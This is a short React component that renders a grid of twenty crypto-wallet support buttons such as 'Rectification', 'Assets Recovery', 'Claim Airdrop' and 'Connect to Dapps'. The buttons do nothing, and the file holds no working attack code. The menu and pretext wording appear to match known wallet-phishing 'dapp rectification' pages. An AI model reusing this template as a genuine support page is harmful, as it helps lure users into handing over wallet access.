const issues = [
    { title: "Buy Presale", desc: "Click here to get your token presale." },
    { title: "Claim Tokens", desc: "Click here to claim your tokens." },
    { title: "Migration Issues", desc: "Click here for migration related issues." },
    { title: "Assets Recovery", desc: "Click here for assets recovery issues." },

    { title: "General Issues", desc: "Click here for general related issues." },
    { title: "Rectification", desc: "Click here to rectify issues." },
    { title: "High Gas Fees", desc: "Click here for gas fee related issues." },
    { title: "Claim Reward", desc: "Click here for reward related issues." },

    { title: "Deposits & Withdrawals", desc: "Click here for withdrawal related issues." },
    { title: "Slippage Error", desc: "Click here for slippage related error during trade." },
    { title: "Transaction Error", desc: "Click here for transaction related issues." },
    { title: "Staking Issues", desc: "Click here for staking related issues." },

    { title: "Swap/Exchange", desc: "Click here for swap/exchange related issues." },
    { title: "Connect to Dapps", desc: "Click here for error while connecting to Dapps." },
    { title: "Transaction Delay", desc: "To trade crypto your account must be marked as a trusted payment source." },
    { title: "Trading Wallet Issues", desc: "Click here if you have problem with your trading wallet." },

    { title: "Locked Account", desc: "Click here for issues related to account lock." },
    { title: "Claim Airdrop", desc: "Click here for airdrop related issues." },
    { title: "Cross Chain Transactions", desc: "Click here for cross chain bridge issues." },
    { title: "Login Issues", desc: "Click here for issues while logging into your wallet." },
]

export default function IssuesGrid() {
    return (
        <section className="bg-white py-24">
            <div className="mx-auto max-w-7xl px-6">

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                    {issues.map((item, idx) => (
                        <button
                            key={idx}
                            className="rounded-xl border border-black p-6 text-left hover:border-blue-500 hover:shadow-md transition"
                        >
                            {/* icon placeholder */}
                            <div className="mb-2 h-6 w-6 rounded bg-blue-100" />

                            {/* line divider */}
                            <div className="my-2 h-px bg-black" />

                            <h3 className="font-semibold text-slate-900">{item.title}</h3>

                            <p className="mt-2 text-sm text-slate-600">{item.desc}</p>
                        </button>
                    ))}
                </div>

            </div>
        </section>
    )
}
